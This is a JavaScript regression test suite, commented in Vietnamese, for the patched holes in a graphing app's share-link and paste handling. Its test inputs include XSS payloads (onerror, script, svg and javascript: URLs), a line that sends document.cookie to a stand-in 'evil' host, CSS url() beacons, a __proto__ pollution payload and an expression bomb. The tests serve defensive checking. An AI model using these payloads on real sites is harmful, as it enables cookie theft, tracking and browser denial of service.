/**
 * Kiểm thử hồi quy cho các lỗ hổng đã vá.
 *
 * Bề mặt tấn công là liên kết chia sẻ `#s=<base64>`: kẻ tấn công dựng URL rồi
 * gửi cho nạn nhân, trình duyệt nạn nhân tự giải mã và dựng lại trạng thái.
 * Mọi dữ liệu đi qua `sanitize()` đều phải coi là không đáng tin.
 */

import { analyze } from '../src/core/analyze.js';
import { ImplicitCurve, IMPLICIT_CELL_BUDGET } from '../src/core/curve.js';
import { sanitizeLatex } from '../src/core/latex.js';
import { sanitize } from '../src/ui/store.js';
import { test, equal, ok } from './harness.js';

/* ------------------------------------------------------------------ */
/* Thực thi mã tuỳ ý qua MathQuill                                     */
/* ------------------------------------------------------------------ */

test('loại bỏ \\text cùng toàn bộ nội dung bên trong', () => {
  // MathQuill 0.10.1 chèn thẳng nội dung `\text{}` vào DOM mà không thoát ký tự.
  const cleaned = sanitizeLatex('y=x+\\text{<img src=x onerror="fetch(evil)">}');
  ok(!cleaned.includes('\\text'), `còn \\text: ${cleaned}`);
  ok(!cleaned.includes('<'), `còn dấu <: ${cleaned}`);
  ok(!/onerror/i.test(cleaned), `còn onerror: ${cleaned}`);
  equal(cleaned, 'y=x+', 'phần toán học hợp lệ được giữ lại');
});

test('loại bỏ mọi lệnh lạ ngoài danh sách cho phép', () => {
  for (const attack of [
    '\\class{a"onload="x}{y}',
    '\\style{background:url(http://evil)}{x}',
    '\\href{javascript:alert(1)}{x}',
    '\\includegraphics{http://evil/a.png}',
  ]) {
    const cleaned = sanitizeLatex(attack);
    ok(!/\\(class|style|href|includegraphics)/.test(cleaned),
       `lệnh lạ còn sót trong "${cleaned}"`);
  }
});

test('loại bỏ cả họ lệnh chữ thẳng của MathQuill, không chỉ \\text', () => {
  // Trong mã nguồn MathQuill 0.10.1, `\textbf`, `\textit`, `\texttt`, `\uppercase`…
  // đều kế thừa cùng khối text-mode: nội dung `{...}` được nối thẳng vào chuỗi
  // HTML rồi dựng bằng jQuery, không qua escaping. Test này khoá danh sách
  // trắng để không ai vô tình thêm họ lệnh này trở lại.
  for (const attack of [
    '\\textbf{<img src=x onerror=1>}',
    '\\textit{<script>alert(1)</script>}',
    '\\texttt{<svg onload=alert(1)>}',
    '\\uppercase{<iframe src="//evil">}',
    '\\emph{<a href="javascript:alert(1)">x</a>}',
  ]) {
    const cleaned = sanitizeLatex(attack);
    ok(!/[<>]/.test(cleaned), `còn ký tự dựng được thẻ HTML trong "${cleaned}"`);
    ok(!/\\(text|emph|italic|strong|bold|uppercase|lowercase)/i.test(cleaned),
       `còn lệnh chữ thẳng trong "${cleaned}"`);
  }
});

test('loại bỏ lệnh chèn thuộc tính style/class của MathQuill', () => {
  // `\textcolor{..}{..}` và `\class{..}{..}` ghép đối số thẳng vào thuộc tính
  // style/class của thẻ span. Ký tự cho phép không có dấu ngoặc kép nên không
  // thoát ra khỏi thuộc tính được, nhưng vẫn chặn từ đầu cho chắc.
  const cleaned = sanitizeLatex('\\textcolor{red}{x}\\class{mq-nonleaf}{y}');
  ok(!/\\(textcolor|class)/.test(cleaned), `lệnh lạ còn sót: ${cleaned}`);
});

test('văn bản dán qua ô nhập cũng bị lọc như liên kết chia sẻ', () => {
  // Bộ lọc paste trong mathfield.js dùng lại đúng sanitizeLatex — đầu vào mô
  // phỏng nội dung clipboard độc hại phải ra cùng kết quả như qua liên kết.
  const pasted = 'x^2+\\text{<img src=x onerror="fetch(\'//evil?\'+document.cookie)">}';
  const cleaned = sanitizeLatex(pasted);
  equal(cleaned, 'x^2+', 'phần toán học hợp lệ được giữ lại');
});

test('lọc sạch nội dung của lệnh lấy nguyên văn, kể cả khi ngoặc lồng nhau', () => {
  // Chỉ còn chữ và số thì không thể ghép thành thẻ HTML, dù có tình cờ chứa
  // những chữ cái như "onerror" đi nữa.
  const cleaned = sanitizeLatex('\\operatorname{a{<img src=x onerror=1>}b}');
  ok(!/[<>="'/]/.test(cleaned), `còn ký tự dựng được thẻ HTML: ${cleaned}`);
});

test('loại bỏ ký tự điều khiển', () => {
  const cleaned = sanitizeLatex('y=x\u0000\u001F\u007F+1');
  equal(cleaned, 'y=x+1', 'chuỗi sau khi lọc');
});

test('không phá hỏng công thức toán hợp lệ', () => {
  for (const valid of [
    'y=x^2',
    '\\frac{x^{2}+1}{\\sqrt{x}}',
    '\\left|x-3\\right|',
    'r=2\\cos\\theta',
    '\\sin^{-1}x+\\log_{2}8',
    'y=x^2\\left\\{0<x<3\\right\\}',
    '\\sqrt[3]{x}\\cdot\\pi',
  ]) {
    equal(sanitizeLatex(valid), valid, `giữ nguyên "${valid}"`);
  }
});

/* ------------------------------------------------------------------ */
/* Rò rỉ thông tin qua CSS                                             */
/* ------------------------------------------------------------------ */

test('màu chỉ được phép ở dạng mã hex', () => {
  const hostile = sanitize({
    functions: [{ latex: 'y=x', color: 'url("http://evil/beacon.png")' }],
  });
  equal(hostile.functions[0].color, undefined, 'màu độc hại bị loại');
});

test('giữ lại màu hex hợp lệ', () => {
  const clean = sanitize({
    functions: [
      { latex: 'y=x', color: '#4c8dff' },
      { latex: 'y=x', color: '#abc' },
    ],
  });
  equal(clean.functions[0].color, '#4c8dff', 'mã 6 ký tự');
  equal(clean.functions[1].color, '#abc', 'mã 3 ký tự');
});

test('chặn các dạng màu lách luật khác', () => {
  for (const bad of [
    'red; background: url(http://evil)',
    'image-set("http://evil/a.png")',
    '#4c8dff; background:url(http://evil)',
    'var(--x)',
  ]) {
    const out = sanitize({ functions: [{ latex: 'y=x', color: bad }] });
    equal(out.functions[0].color, undefined, `phải loại "${bad}"`);
  }
});

/* ------------------------------------------------------------------ */
/* Treo trình duyệt qua khung nhìn                                     */
/* ------------------------------------------------------------------ */

test('kẹp tâm nhìn về khoảng an toàn', () => {
  // cx = 1e17 làm bước chia nhỏ hơn khoảng cách giữa hai số thực liền nhau,
  // khiến vòng lặp vẽ lưới không tiến được và treo cứng cả thẻ trình duyệt.
  const out = sanitize({ functions: [], view: { cx: 1e17, cy: -1e300, s: 45 } });
  ok(Math.abs(out.view.cx) <= 1e12, `cx = ${out.view.cx}`);
  ok(Math.abs(out.view.cy) <= 1e12, `cy = ${out.view.cy}`);
});

test('kẹp hệ số phóng về khoảng an toàn', () => {
  const huge = sanitize({ functions: [], view: { cx: 0, cy: 0, s: 1e308 } });
  ok(huge.view.s <= 1e12, `s = ${huge.view.s}`);
  const tiny = sanitize({ functions: [], view: { cx: 0, cy: 0, s: 5e-324 } });
  ok(tiny.view.s >= 1e-9, `s = ${tiny.view.s}`);
});

test('bỏ qua khung nhìn có giá trị không phải số', () => {
  const out = sanitize({ functions: [], view: { cx: 'x', cy: null, s: NaN } });
  equal(out.view.cx, undefined, 'cx');
  equal(out.view.s, undefined, 's');
});

/* ------------------------------------------------------------------ */
/* Treo trình duyệt bằng khối lượng tính toán                          */
/* ------------------------------------------------------------------ */

test('chặn biểu thức phức tạp quá mức', () => {
  // Bộ vẽ gọi hàm đã biên dịch hàng chục nghìn lần *mỗi khung hình*, nên chi
  // phí một lần lấy mẫu phải có trần. Chuỗi luỹ thừa `x^x^x^…` nhồi được một
  // nút chỉ với hai ký tự, nên 500 ký tự mà liên kết chia sẻ cho phép là thừa
  // sức dựng cây vài trăm nút.
  const bomb = 'y=' + 'x^'.repeat(150) + 'x';
  const result = analyze(sanitizeLatex(bomb));
  ok(result.error, 'phải báo lỗi thay vì biên dịch');
  ok(/quá phức tạp/.test(result.error), `thông báo: ${result.error}`);
  equal(result.curve, null, 'không dựng đường cong');
});

test('vẫn nhận công thức phổ thông rậm rạp nhất', () => {
  // Trần phải rộng hơn hẳn mọi thứ người học có thể gõ ra (bài này 79 nút).
  const dense =
    'y=\\frac{x^5-3x^4+2x^3-7x^2+11x-13}{x^4+2x^3-5x^2+x-9}' +
    '+\\sqrt[3]{x^2-4}-\\ln(x^2+1)+\\sin(3x)\\cos(2x)\\tan(x/2)';
  const result = analyze(dense);
  equal(result.error, null, `không được từ chối: ${result.error}`);
  ok(result.curve, 'phải dựng được đường cong');
});

test('ngân sách lưới chặn chi phí lấy mẫu của đường cong ẩn', () => {
  // `sin(60x)·cos(60y) = 0` có tập nghiệm dày đặc: gần như ô lưới nào cũng có
  // giao, nên số lần chiếu Newton — phần đắt nhất — tăng theo bình phương độ
  // mịn. Một liên kết chia sẻ cài được 24 đường như vậy.
  const view = { xMin: -8.4, xMax: 8.4, yMin: -6, yMax: 6, width: 980, height: 700 };
  const evaluations = (cellBudget) => {
    let calls = 0;
    const curve = new ImplicitCurve({
      F: (x, y) => { calls++; return Math.sin(60 * x) * Math.cos(60 * y); },
      latex: 'sin(60x)cos(60y)=0',
      cellBudget,
    });
    curve.computeBranches(view, {});
    return calls;
  };

  const shared = evaluations(IMPLICIT_CELL_BUDGET / 24);
  const unbounded = evaluations(Infinity);

  ok(shared * 4 < unbounded,
     `ngân sách phải cắt ít nhất 4 lần: ${shared} so với ${unbounded}`);
  ok(shared * 24 < 1e6,
     `24 đường cong không được vượt 1 triệu lần gọi: ${shared * 24}`);
});

test('cảnh bình thường không bị giảm độ mịn', () => {
  // Ngân sách chia cho vài đường cong vẫn dư để giữ độ mịn tối đa — chỉ những
  // cảnh dày đặc bất thường mới bị hạ xuống.
  const view = { xMin: -8.4, xMax: 8.4, yMin: -6, yMax: 6, width: 980, height: 700 };
  const points = (cellBudget) => {
    const { curve } = analyze('x^2+y^2=25');
    curve.cellBudget = cellBudget;
    return curve.branches(view).reduce((sum, b) => sum + b.pts.length, 0);
  };
  equal(points(IMPLICIT_CELL_BUDGET / 3), points(Infinity), 'đường tròn với 3 đường ẩn');
});

/* ------------------------------------------------------------------ */
/* Bền với dữ liệu dị dạng                                             */
/* ------------------------------------------------------------------ */

test('chịu được dữ liệu dị dạng mà không ném lỗi', () => {
  for (const junk of [null, 42, 'abc', [], { functions: 'x' }, { functions: [null, 5] }]) {
    sanitize(junk);
  }
  const many = sanitize({ functions: Array(500).fill({ latex: 'y=x' }) });
  ok(many.functions.length <= 24, `giới hạn số hàm: ${many.functions.length}`);
});

test('không bị ô nhiễm nguyên mẫu qua __proto__', () => {
  sanitize(JSON.parse('{"functions":[],"view":{"__proto__":{"polluted":1}}}'));
  equal({}.polluted, undefined, 'Object.prototype phải sạch');
});
